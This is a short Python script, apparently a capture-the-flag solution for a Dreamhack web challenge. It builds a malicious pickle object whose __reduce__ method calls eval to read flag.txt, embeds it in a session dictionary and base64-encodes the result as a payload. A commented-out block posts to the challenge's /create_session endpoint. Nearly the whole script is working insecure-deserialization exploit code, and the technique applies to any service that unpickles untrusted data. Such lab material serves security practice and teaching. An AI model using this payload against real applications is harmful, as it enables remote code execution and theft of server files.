import pickle
import base64
import requests
import os
import pickletools

class Exploit(object):
    def __reduce__(self):
        p = "open('./flag.txt', 'r').read()"
        return (eval,(p,))

'''
URL = "http://host3.dreamhack.games:19863"
URI = "/create_session"
DATA = {'name':'test','userid':'test','password':'test'}

resp = requests.post(URL + URI, data=DATA)

print(resp.text)

'''

ClassA = Exploit()

TEST = "gAN9cQAoWAQAAABuYW1lcQFYBAAAAHRlc3RxAlgGAAAAdXNlcmlkcQNYBAAAAHRlc3RxBFgIAAAAcGFzc3dvcmRxBVgEAAAAdGVzdHEGdS4="
DUMP = base64.b64decode(TEST)

data1 = pickle.dumps(DUMP)
data2 = pickle.dumps({
    'name':ClassA,
    'userid':'test',
    'password':'test'
})

PAYLOAD = base64.b64encode(data2)

print(PAYLOAD)

print(pickle.loads(data2))